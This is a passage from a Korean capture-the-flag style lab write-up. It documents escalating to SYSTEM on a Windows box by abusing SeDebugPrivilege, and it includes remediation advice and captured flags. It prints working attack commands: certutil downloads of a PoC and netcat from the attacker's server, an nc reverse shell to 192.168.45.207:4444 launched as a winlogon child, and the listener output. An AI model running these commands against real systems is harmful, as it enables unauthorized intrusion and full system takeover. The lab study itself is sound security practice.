   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
```

셸의 작업 디렉터리가 `C:\Users\Wilson\Desktop` — FTP 서비스가 `Wilson` 계정 컨텍스트에서 그 디렉터리를 CWD로 삼아 실행 중임을 뜻함(SYSTEM 이었다면 여기서 이미 끝났을 것).

**Local.txt value:**
`1626da9ca8660f809d1df31fa797af30`

### Privilege Escalation – SeDebugPrivilege

**Vulnerability Explanation:** `Wilson` 계정 토큰에 `SeDebugPrivilege` 가 Enabled 상태로 부여됨. 이 권한은 `OpenProcess` 호출 시 대상 프로세스의 DACL 검사를 통째로 우회하도록 설계돼 있어, SYSTEM 프로세스(`winlogon.exe`)에도 `PROCESS_ALL_ACCESS` 핸들을 열 수 있음. 그 핸들을 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` 로 넘겨 자식 프로세스를 생성하면 부모(SYSTEM)의 토큰을 상속.

**Vulnerability Fix:**
- 일반 사용자 계정에서 `SeDebugPrivilege`(및 `SeLoadDriverPrivilege`) 회수 — 로컬 보안 정책 → 사용자 권한 할당 → "프로그램 디버그"에 Administrators만 남김
- FTP 서비스 계정을 최소 권한 전용 서비스 계정으로 분리해, 애초에 상승된 토큰을 가진 대화형 사용자 컨텍스트에서 서비스가 돌지 않도록 함

**Severity:** Critical — 로컬 사용자 권한에서 토큰 권한 하나로 즉시 SYSTEM 획득

**Steps to reproduce the attack:**
1. `whoami /priv` 로 `SeDebugPrivilege: Enabled` 확인, `SeImpersonatePrivilege` 부재로 Potato 계열 배제
2. `certutil -urlcache -split -f` 로 `SeDebugPrivilegePoC.exe`·`nc64.exe` 를 Kali 웹서버에서 전송(`nc64.exe` 최초 전송은 404 본문이 335바이트로 저장돼 실패, `nc64_new.exe` 로 재전송해 정상 크기 확보)
3. `.\SeDebugPrivilegePoC.exe "<nc64_new.exe 경로> 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"` 실행 → winlogon PID 탐색 → `PROCESS_ALL_ACCESS` 핸들 획득 → winlogon 자식으로 리버스셸 프로세스 생성
4. `nc -lnvp 4444` 리스너로 SYSTEM 셸 수신

`whoami /priv` 열거 결과:

```bash
C:\Users\Wilson\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                   State
=============================== ============================================= ========
SeLoadDriverPrivilege           Load and unload device drivers                Disabled
SeDebugPrivilege                Debug programs                                Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled
SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                Disabled
```

`State: Disabled` 는 사용 불가가 아니라 토큰에 존재하되 비활성 상태 — `AdjustTokenPrivileges` 로 스스로 켤 수 있음. `SeImpersonatePrivilege` 는 행 자체가 없어 Potato 계열은 애초에 배제.

파일 전송:

```bash
C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
certutil -urlcache -split -f http://192.168.45.207/SeDebugPrivilegePoC.exe
****  Online  ****
  0000  ...
  2a00
CertUtil: -URLCache command completed successfully.

C:\Users\Wilson\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               2 File(s)         10,786 bytes
               2 Dir(s)  24,216,596,480 bytes free

C:\Users\Wilson\Desktop>certutil -urlcache -split -f http://192.168.45.207/nc64.exe
certutil -urlcache -split -f http://192.168.45.207/nc64.exe
****  Online  ****
  0000  ...
  014f
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
CertUtil: Not found (404).

C:\Users\Wilson\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 80CF-7607

 Directory of C:\Users\Wilson\Desktop

08/17/2026  06:14 PM    <DIR>          .
08/17/2026  06:14 PM    <DIR>          ..
08/17/2026  05:49 PM                34 local.txt
08/17/2026  06:14 PM               335 nc64.exe
08/17/2026  06:14 PM            10,752 SeDebugPrivilegePoC.exe
               3 File(s)         11,121 bytes
               2 Dir(s)  24,215,904,256 bytes free
```

`nc64.exe` 335바이트는 404 응답 본문 — `-split` 는 HTTP 상태 코드와 무관하게 응답 본문을 파일로 씀. 이후 원문은 `nc64_new.exe` 라는 다른 파일명으로 재전송해 정상 크기를 확보한 상태로 이어짐(재전송 명령 자체는 원문에 없음).

PoC 실행 — winlogon 자식 프로세스 생성:

```bash
C:\Users\Wilson\Desktop>.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe"
[*] Modified by r4j3sh
[*] Executing command: C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e C:\Windows\system32\cmd.exe
[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
[*] This PoC tries to Execute the command as a winlogon.exe's child process.
[>] Searching winlogon PID.
[+] PID of winlogon: 552
[>] Trying to get handle to winlogon.
[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x2C0).
[+] New process is created successfully.
    |-> PID : 1076
    |-> TID : 4324
```
사용한 PoC: <https://github.com/r4j3sh-com/SeDebugPrivilegePoC>

SYSTEM 셸 수신:

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.20] 50087
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Wilson\Desktop>whoami
whoami
nt authority\system

C:\Users\Wilson\Desktop>type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
d75fcc9d6d14a696241176dda9889aa1

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
```

### Post-Exploitation

**Proof.txt value:**
`d75fcc9d6d14a696241176dda9889aa1`

**남긴 흔적**
- Initial Access 단계는 **파일을 남기지 않음** — 셸코드는 `RETR` 인자로 메모리에만 전달됐고 착지 페이지는 `VirtualAlloc` 이 커밋한 RWX 스택 영역
- `C:\Users\Wilson\Desktop\SeDebugPrivilegePoC.exe` · `nc64.exe`(335바이트 쓰레기) · `nc64_new.exe` — 전부 남아 있음(랩 Stop/Revert로만 소멸)
- `certutil` URL 캐시 항목 남음(`certutil -urlcache * delete` 로 정리 가능)
- 계정 생성·설정 변경 없음
- 획득 자격증명: `admin`/`admin`(Simple FTP Server 앱 전용). OS 계정 `osaka\Wilson` 의 암호는 미확보(SeDebugPrivilege 경로라 필요 없었음)
- FTP 서비스 프로세스는 익스플로잇으로 스택이 파괴됐으므로 재실행하려면 서비스 재시작이 필요할 가능성이 높음 [가정]

## 관련

- `SeDebugPrivilege` PoC(이 박스에서 사용): <https://github.com/r4j3sh-com/SeDebugPrivilegePoC>
- `VirtualAlloc` 원형·플래그(`MEM_COMMIT=0x1000`, `PAGE_EXECUTE_READWRITE=0x40`): <https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc>
- Windows 권한 목록: <https://learn.microsoft.com/windows/win32/secauthz/privilege-constants>
- 권한 남용 정리(Potato 계열 포함): <https://github.com/gtworek/Priv2Admin>
- mona.py(ROP 체인 자동 생성): <https://github.com/corelan/mona>
- LOLBAS `certutil`: <https://lolbas-project.github.io/lolbas/Binaries/Certutil/>
- CVE 없음 — 랩용 커스텀 FTP 서버. CWE-134(포맷 스트링) + CWE-121(스택 버퍼 오버플로우)
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드
- [[Hawat]] — "응답이 성공을 뜻하지 않는다" 패턴. 이 박스의 `certutil` 404-그러나-파일-생성이 같은 계열
- [[_PLAYBOOK#B-95. nmap 이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보]] · [[_PLAYBOOK#B-96. 포맷 스트링 릭으로 ASLR 우회 — 64KB 할당 단위로 베이스를 검산한다]] · [[_PLAYBOOK#B-97. `VirtualAlloc` ROP — `PUSHAD` 한 번으로 호출 프레임을 조립한다]] · [[_PLAYBOOK#B-98. 셸코드는 붙이기 전에 눈으로 검증한다 — badchar 통과는 파서 구조의 증거다]] · [[_PLAYBOOK#B-99. 셸코드 아키텍처를 확정하지 않고 만들면 즉사한다]] · [[_PLAYBOOK#B-9-10. 원샷 익스플로잇 — 던지기 직전 5항목]] · [[_PLAYBOOK#B-9-11. pwntools `recvuntil` 뒤 잔여 개행 — 인덱스가 하나씩 밀린다]]
- [[_PLAYBOOK#B-48. `SeDebugPrivilege` 는 그 자체로 SYSTEM 상승 경로다]] — winlogon 핸들 탈취
- [[_PLAYBOOK#B-8-11. FTP 는 `binary` 모드 — 크기 불일치는 CRLF 형과 truncation 형을 갈라서 진단한다]] — `ftp.exe` 손상 재검증
- [[_PLAYBOOK#A-1-31. `Microsoft-HTTPAPI` 배너가 뜨는 포트에 디렉터리 브루트는 헛수고다]] · [[_PLAYBOOK#A-3-17. Windows 셸인데 Linux 반사로 치고 있다]]
